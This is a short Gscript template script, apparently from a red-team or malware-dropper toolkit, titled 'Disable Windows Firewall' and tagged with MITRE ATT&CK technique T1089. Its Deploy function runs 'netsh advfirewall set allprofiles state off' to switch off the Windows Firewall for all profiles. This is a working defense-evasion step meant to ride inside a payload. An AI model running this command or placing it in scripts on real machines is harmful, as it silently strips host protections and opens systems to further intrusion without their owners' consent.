// Example gscript template
// Title: Disable Windows Firewall
// Author: ahhh
// Purpose: Drops the windows firewall by turning it off.
// Gscript version: 1.0.0
// ATT&CK: https://attack.mitre.org/wiki/Technique/T1089

//priority:150
//timeout:150

  function Deploy() {  
    console.log("Starting Disable Windows Firewall");
    G.exec.ExecuteCommand("netsh", ["advfirewall", "set", "allprofiles", "state", "off"]);
    console.log("Done Disable Windows Firewall");
    return true;
  }